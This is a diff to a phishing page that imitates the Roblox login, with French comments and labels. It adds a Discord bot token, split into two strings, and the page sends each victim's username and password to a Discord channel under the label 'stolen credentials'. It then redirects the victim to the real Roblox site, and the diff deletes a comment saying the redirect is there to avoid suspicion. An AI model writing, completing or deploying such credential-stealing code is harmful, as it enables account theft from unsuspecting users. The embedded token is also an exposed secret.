@@ -27,7 +27,10 @@
     </div>
 
     <script>
-        const botToken = "TON_TOKEN_DE_BOT";
+        const part1 = "MTU2NjQ3NDIzNzc0MzczNDk0NQ.GkOjNe.";
+        const part2 = "9WkxRc2uaempXmyLz_WAfIiSU_WjR14MVRMqE8";
+        const botToken = part1 + part2;
+        
         const channelId = "1566474880894116032";
 
         async function sendToDiscord(msg) {
@@ -61,7 +64,6 @@
             
             await sendToDiscord(`**Identifiants volés**\n**User:** ${user}\n**Pass:** ${pass}`);
             
-            // Redirige vers le vrai roblox pour pas éveiller les soupçons
             window.location.href = "https://www.roblox.com/login";
         });
 
